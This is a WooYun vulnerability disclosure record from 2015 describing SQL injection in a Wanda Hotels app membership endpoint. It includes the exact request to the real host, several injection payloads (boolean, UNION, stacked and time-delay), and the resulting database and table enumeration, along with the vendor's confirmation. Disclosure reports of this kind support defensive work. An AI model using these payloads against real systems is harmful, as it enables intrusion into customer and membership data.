{"id": 72245, "wybug_id": "wooyun-2015-0152879", "wybug_title": "万达酒店(wanda_hotal)某APP/SQL注入一枚影响会员数据用户数据", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "逆流冰河", "wybug_date": "2015-11-08 22:42", "wybug_open_date": "2015-12-24 09:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向公众公开  简要描述： 我是不是有点标题党的感觉,好吧,我承认了 详细说明：  1,万恶的程序猿们,不注意安全,我去找王思聪了注入点:POST http://app.wandahotels.com/hotelprocess/membership/getMembershipList.action HTTP/1.1Content-Length: 6Content-Type: application/x-www-form-urlencodedHost: app.wandahotels.comConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)code=12,注射点就是这个codeParameter: code    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: code=1 AND 3632=3632    Type: UNION query    Title: Generic UNION query (NULL) - 14 columns    Payload: code=1 UNION ALL SELECT NULL, CHAR(58)+CHAR(120)+CHAR(118)+CHAR(110)+CHAR(58)+CHAR(70)+CHAR(70)+CHAR(99)+CHAR(116)+CHAR(119)+CHAR(104)+CHAR(81)+CHAR(67)+CHAR(121)+CHAR(74)+CHAR(58)+CHAR(114)+CHAR(115)+CHAR(104)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: code=1; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: code=1 WAITFOR DELAY '0:0:5'-----available databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] wyhappdb3,wyhappdb库的表挺多挺重要Database: wyhappdb[72 tables]+-------------------------------+| dbo.code_couponType           || dbo.code_opera                || dbo.code_purview              || dbo.code_resource             || dbo.complaint                 || dbo.coupon                    || dbo.department                || dbo.group_hot                 || dbo.group_locate              || dbo.group_story               || dbo.hotel                     || dbo.hotelGrade                || dbo.hotel_facility            || dbo.hotel_facility_desc       || dbo.hotel_facility_type       || dbo.hotel_image               || dbo.hotels_group              || dbo.index_image               || dbo.login_info                || dbo.menus                     || dbo.menus_resources           || dbo.position                  || dbo.resources                 || dbo.roomTypeUpgrade           || dbo.roomType_point            || dbo.sysdiagrams               || dbo.user                      || dbo.wd_about                  || dbo.wd_clause                 || dbo.wd_coupon                 || dbo.wd_coupon_count           || dbo.wd_exchange_his           || dbo.wd_feedback               || dbo.wd_point_rules            || dbo.wd_version                || dbo.wh_about                  || dbo.wh_city                   || dbo.wh_clause                 || dbo.wh_complaint              || dbo.wh_cooking                || dbo.wh_coupon                 || dbo.wh_cuisine                || dbo.wh_dish                   || dbo.wh_feedback               || dbo.wh_group                  || dbo.wh_group_hot              || dbo.wh_group_locate           || dbo.wh_group_story            || dbo.wh_hotel                  || dbo.wh_hotel_facility         || dbo.wh_hotel_facility_desc    || dbo.wh_hotel_facility_type    || dbo.wh_hotel_image            || dbo.wh_hotel_restaurant_group || dbo.wh_hotel_specialty_group  || dbo.wh_hotels_group           || dbo.wh_index_image            || dbo.wh_jobs                   || dbo.wh_login_info             || dbo.wh_membership             || dbo.wh_menus                  || dbo.wh_menus_resources        || dbo.wh_news                   || dbo.wh_newtype                || dbo.wh_periodical             || dbo.wh_privilege              || dbo.wh_privilege_hotel_group  || dbo.wh_resources              || dbo.wh_restaurant_group       || dbo.wh_specialty              || dbo.wh_version                || dbo.wh_vip                    |+-------------------------------+4,user表和vip会不会有王思聪呢?那张表是开房记录,我就不找了,怕扎我去喝咖啡   漏洞证明：  如上   修复方案：  20 rank可好?   版权声明：转载请注明来源 逆流冰河@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-09 09:36 厂商回复： 感谢逆流冰河同学的关注与贡献！乌云审洞不严，此洞与http://www.wooyun.org/bugs/wooyun-2015-重复了。已通知业务整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-12-24 09:47 |    \t\t北丐 \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:23        | 回收WB，1WB=5RMB，有意出售的表哥请私信)\t\t \n  感谢逆流冰河同学的关注与贡献！乌云审洞不严，此洞与http://www.wooyun.org/bugs/wooyun-2015-重复了。已通知业务整改！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}